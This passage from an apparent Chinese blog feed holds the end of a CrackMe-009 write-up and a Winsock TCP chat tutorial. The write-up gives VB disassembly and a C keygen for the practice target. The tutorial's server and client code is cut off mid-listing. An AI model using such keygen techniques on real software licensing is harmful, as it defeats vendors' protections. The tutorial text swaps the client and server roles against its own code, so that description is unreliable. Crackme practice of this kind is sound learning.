class="hljs-number">54</span>FFFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-symbol">00402218 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040221</span>A   .  <span class="hljs-number">52</span>            push edx<br><span class="hljs-number">0040221</span>B   .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-symbol">00402225 </span>  .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-number">0040222</span>F   .  FFD3          <span class="hljs-keyword">call</span> ebx                                 ;  &lt;&amp;MSVBVM50.__vbaMidStmtVar&gt;<br><span class="hljs-symbol">00402231 </span>  .  <span class="hljs-number">8D45</span> CC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402234 </span>  .  <span class="hljs-number">8D8</span>D <span class="hljs-number">54</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-number">0040223</span>A   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040223</span>B   .  <span class="hljs-number">6</span>A <span class="hljs-number">09</span>         push <span class="hljs-number">0</span>x9<br><span class="hljs-number">0040223</span>D   .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040223</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402240 </span>  .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-number">0040224</span>A   .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00402254 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx<br></code></pre></div></td></tr></table></figure><p>下面开始编写注册机</p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>根据以上分析的结果</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">gets_s</span>(name);<br><span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> key = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br>key += name[i];<br>&#125;<br>key *= <span class="hljs-number">0x499602D2</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>];<br><span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%lld&quot;</span>, key);<br>buf[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br>buf[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你的key是：\n%s&quot;</span>, buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/09/160CrackMe-009/7.png"></p><p><img src="/2021/08/09/160CrackMe-009/8.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>分析起来不难，主要是VB的特性让人很折磨。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输技术-SOCKET通信</title>
    <link href="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/"/>
    <url>/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="SOCKET通信"><a href="#SOCKET通信" class="headerlink" title="SOCKET通信"></a>SOCKET通信</h3><p>socket也被叫做“套接字”，应用程序通常通过“套接字”向网络发出请求或者接收请求。socket表示是：IP地址加上端口号，如127.0.0.1:8080。Socket编程有两种通信协议可以选择，一种是TCP，另一种是UDP。先来说一下基于TCP的Socket编程。</p><h4 id="基于TCP-Socket编程"><a href="#基于TCP-Socket编程" class="headerlink" title="基于TCP Socket编程"></a>基于TCP Socket编程</h4><p>TCP是一种基于连接的协议，在进行通信之前，必须要建立连接，其中服务端监听请求，客户端发送请求。当建立好了连接之后，就可以开始通信了。</p><h5 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h5><h6 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h6><p>根据指定的地址族、数据类型和协议来分配一个套接口的描述字及其所有资源的函数。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">SOCKET <span class="hljs-title">socket</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> af,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> type,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> protocol)</span></span>;<br></code></pre></div></td></tr></table></figure><p>af：指定地址族规范。地址系列的可能值在Winsock2.h头文件中定义。当前支持AF_INET或者AF_INET6，它们是IPV4和IPV6的互联网地址族格式。</p><p>type：指定socket类型，SOCK_STREAM类型指定产生流式套接字，SOCK_DGRAM类型指定产生数据报式套接字，而SOCK_RAW类型指定产生原始套接字（只有管理员权限的用户可以创建原始套接字）。</p><p>protocol：与特定地址家族相关的协议IPPROTO_TCP、IPPROTO_UP、IPPROTO_IP，如果指定为0，那么系统会根据地址格式和套接字类别，自动选择一个合适的协议。</p><p>返回值：如果没有发生错误，则套接字返回引用新套接字的描述符，否则返回INVALID_SOCKET。</p><h6 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h6><p>将本地地址与套接字相关联</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim"><span class="hljs-built_in">int</span> <span class="hljs-keyword">bind</span>(<br>  <span class="hljs-type">SOCKET</span>         s,<br>  <span class="hljs-keyword">const</span> sockaddr *<span class="hljs-keyword">addr</span>,<br>  <span class="hljs-built_in">int</span>            namelen<br>);<br></code></pre></div></td></tr></table></figure><p>s：标识未绑定套接字的描述符。</p><p>addr：指向要分配给绑定套接字的本地地址的sockaddr结构的指针。</p><p>namelen：name参数指向值的长度。</p><p>返回值：如果没有发生错误，则bind返回0，否则返回SOCKET_ERROR。</p><h6 id="htons"><a href="#htons" class="headerlink" title="htons"></a>htons</h6><p>将整型变量从主机字节顺序转变成网络字节顺序，就是整数在地址空间中的存储方式变为高位字节存放在内存的低地址处。</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">u_short htons(<br>  u_short hostshort<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hostshort：指定主机字节顺序为16位。</p><p>返回值：返回TCP/IP网络字节顺序。</p><h6 id="inet-addr"><a href="#inet-addr" class="headerlink" title="inet_addr"></a>inet_addr</h6><p>将一个点分十进制的IP转换成一个长整型数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">inet_addr</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cp</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>返回值：如果没有发生错误，返回一个无符号长整型值，其中包含给定互联网地址的适当的二进制表示形式。</p><h6 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h6><p>将一个套接字置于正在监听传入连接的状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">listen</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ SOCKET s,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> backlog)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识绑定的未连接套接字的描述符。</p><p>backlog：指定待连接队列的最大长度。如果设置为SOMAXCONN，则负责套接字的底层服务提供商将积压设置为最大合理值。如果设置为SOMAXCONN_HINT(N)（其中N是数字），则积压值为N，调整范围（200,65535）。</p><p>返回值：如没有发生错误，返回0，否则返回SOCKET_ERROR。</p><h6 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h6><p>允许在套接字上尝试连接</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">SOCKET accept (<br>      _In_ SOCKET s,<br>      <span class="hljs-constructor">_Out_writes_bytes_opt_(<span class="hljs-operator">*</span><span class="hljs-params">addrlen</span>)</span> <span class="hljs-keyword">struct</span> sockaddr FAR *addr,<br>      _Inout_opt_ <span class="hljs-built_in">int</span> FAR *addrlen);<br></code></pre></div></td></tr></table></figure><p>s：描述符，用于标识使用listen功能并处于侦听状态的套接字。连接实际上是由accept返回的套接字。</p><p>addr：指定一个可选缓冲区的指针，它接受通信层中已知连接实体的地址。addr参数的确切格式由创建sockaddr结构的套接字时建立的地址族来确定。</p><p>addrlen：指向一个整数的可选指针，其中包含由addr参数指向的结构长度。</p><p>返回值：如果没有发生错误，则accept返回一个SOCKET类型的值，该值是新套接字的描述符。此返回值是实际连接所在的套接字的句柄。否则返回INVALID_SOCKET。</p><h6 id="send"><a href="#send" class="headerlink" title="send"></a>send</h6><p>在建立连接的套接字上发送数据</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">send</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ SOCKET s,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_reads_bytes_(len) <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> FAR * buf,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识连接的套接字的描述符。</p><p>buf：指向要发送的数据缓冲区的指针。</p><p>len：由buf参数指向缓冲区中数据的长度。</p><p>flags：指定一组调用方式的标志，一般置为0。</p><p>返回值：如果没有发生错误，返回发送的字节数，否则返回SOCKET_ERROR。</p><h6 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h6><p>从连接的套接字或绑定的无连接套接字中接收数据。</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> recv (<br>    _In_ SOCKET s,<br>    <span class="hljs-constructor">_Out_writes_bytes_to_(<span class="hljs-params">len</span>, <span class="hljs-params">return</span>)</span> <span class="hljs-constructor">__out_data_source(NETWORK)</span> <span class="hljs-built_in">char</span> FAR<span class="hljs-operator"> * </span>buf,<br>    _In_ <span class="hljs-built_in">int</span> len,<br>    _In_ <span class="hljs-built_in">int</span> flags);<br></code></pre></div></td></tr></table></figure><p>s：标识连接的套接字的描述符。</p><p>buf：指向缓冲区的指针，用于接收传入的数据。</p><p>len：由buf参数指向缓冲区中数据的长度。</p><p>flags：指定一组调用方式的标志，一般置为0。</p><p>返回值，如果没有发生错误，则recv返回接收到的字节数，由buf参数指向的缓冲区将包含接收到的数据。如果连接已经正常关闭，则返回值为0.</p><h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p>客户端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，调用bind函数绑定，再调用listen函数进行监听。当有连接请求时，调用accept函数接收连接请求。建立连接后，使用recv和send函数进行通信。</p><p>服务端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，然后调用connect函数发送连接请求，建立连接后，使用recv和send函数进行通信。</p><h6 id="服务端代码："><a href="#服务端代码：" class="headerlink" title="服务端代码："></a>服务端代码：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;WinSock2.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Ws2_32.lib&quot;</span>)</span><br><span class="hljs-function">BOOL <span class="hljs-title">SocketBindAndListen</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszIP, <span class="hljs-keyword">int</span> Port)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span>;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span></span>;<br>SOCKET g_ServerSocket;<br>SOCKET g_ClientSocket;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-keyword">if</span> (SocketBindAndListen(<span class="hljs-string">&quot;IP地址&quot;</span>, <span class="hljs-number">12345</span>) == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;连接建立成功，开始通信\n&quot;</span>);<br><span class="hljs-keyword">char</span> szSendmsg[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>gets_s(szSendmsg);<br>SendMsg(szSendmsg);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SocketBindAndListen</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszIP, <span class="hljs-keyword">int</span> Port)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//初始化winsock库</span><br>WSADATA wsaData = &#123; <span class="hljs-number">0</span> &#125;;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><span class="hljs-comment">//创建套接字</span><br>g_ServerSocket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>sockaddr_in addr;<br>addr.sin_family = AF_INET;<br>addr.sin_port = htons(Port);<br>addr.sin_addr.S_un.S_addr = inet_addr(lpszIP);<br><span class="hljs-comment">//绑定IP和端口</span><br><span class="hljs-keyword">if</span> (bind(g_ServerSocket, (sockaddr*)(&amp;addr), <span class="hljs-keyword">sizeof</span>(addr)) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//设置监听</span><br><span class="hljs-keyword">if</span> (listen(g_ServerSocket, <span class="hljs-number">1</span>) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">int</span> len = <span class="hljs-keyword">sizeof</span>(addr);<br>g_ClientSocket = accept(g_ServerSocket, (sockaddr*)(&amp;addr), &amp;len);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收客户端连接请求\n&quot;</span>);<br><span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">//接收数据</span><br><span class="hljs-keyword">int</span> Ret = recv(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Ret &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到数据：%s\n&quot;</span>, szBuffer);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>send(g_ClientSocket, pszSend, (<span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend)), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, pszSend);<br>&#125;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span> </span>&#123;<br>AcceptRecvMsg();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h6 id="客户端代码："><a href="#客户端代码：" class="headerlink" title="客户端代码："></a>客户端代码：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;WinSock2.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Ws2_32.lib&quot;</span>)</span><br>SOCKET g_ServerSocket;<br><span class="hljs-function">BOOL <span class="hljs-title">Connection</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszServerIP, <span class="hljs-keyword">int</span> ServerPort)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RecvMsg</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入服务器IP\n&quot;</span>);<br><span class="hljs-keyword">char</span> ipaddr[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>gets_s(ipaddr);<br><span class="hljs-keyword">if</span> (Connection(ipaddr, <span class="hljs-number">12345</span>) == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接失败\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接成功，开始通信\n&quot;</span>);<br><span class="hljs-keyword">char</span> szSend[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>gets_s(szSend);<br>SendMsg(szSend);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">Connection</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszServerIP, <span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>WSADATA wsaData = &#123; <span class="hljs-number">0</span> &#125;;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br>g_ServerSocket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (g_ServerSocket == INVALID_SOCKET)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>addr.sin_family = AF_INET;<br>addr.sin_port = htons(ServerPort);<br>addr.sin_addr.S_un.S_addr = inet_addr(lpszServerIP);<br><br><span class="hljs-keyword">if</span> (connect(g_ServerSocket, (sockaddr*)(&amp;addr), <span class="hljs-keyword">sizeof</span>(addr)))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span> </span>&#123;<br>send(g_ServerSocket, pszSend, (<span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend)), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送消息：%s\n&quot;</span>,pszSend);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RecvMsg</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">int</span> ret = recv(g_ServerSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到消息：%s\n&quot;</span>, szBuffer);<br>&#125;<br>&#125;<br><br><br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span> </span>&#123;<br>RecvMsg();<br><span class="hljs-keyword">return</span> <span 